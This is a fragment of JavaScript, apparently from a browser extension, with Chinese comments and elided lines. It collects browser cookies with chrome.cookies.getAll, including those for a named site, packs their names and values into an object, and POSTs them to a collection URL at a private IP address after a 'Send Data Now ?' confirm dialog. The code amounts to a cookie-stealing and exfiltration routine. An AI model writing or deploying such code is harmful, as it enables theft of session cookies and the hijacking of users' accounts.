...
function onload() {
  ...
  chrome.cookies.getAll({}, function(cookies) {
   ...
   function sendInfor(objects,url){ 
	var xmlhttp = createXMLhttp(); 
	xmlhttp.open("POST",url,true); 
	    //xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");    可以用$_POST 接收
		//xmlhttp.send("user=SDFSD&password=SDFSF"); 
	     ...
	     if (xmlhttp.readyState==4){ 
	          alert("Network connection success!"); 
...
document.addEventListener('DOMContentLoaded', function() {
  ...
  var keys;
  var values;
  var url='http://192.168.42.1/index.php';
  
  chrome.cookies.getAll({url:'http://tese.com/'}, function(cookies) {
  //  startListening();
   // start = new Date();
    for (var i in cookies) {
     // cache.add(cookies[i]);
	 keys=cookies[i].name
	 cookiesAll[keys]=cookies[i].value;
    }
    
	// timer.reset();
    // reloadCookieTable();
    var a=confirm("Send Data Now ?");
	if(a==true)
	{

     sendInfor(cookiesAll,url);	
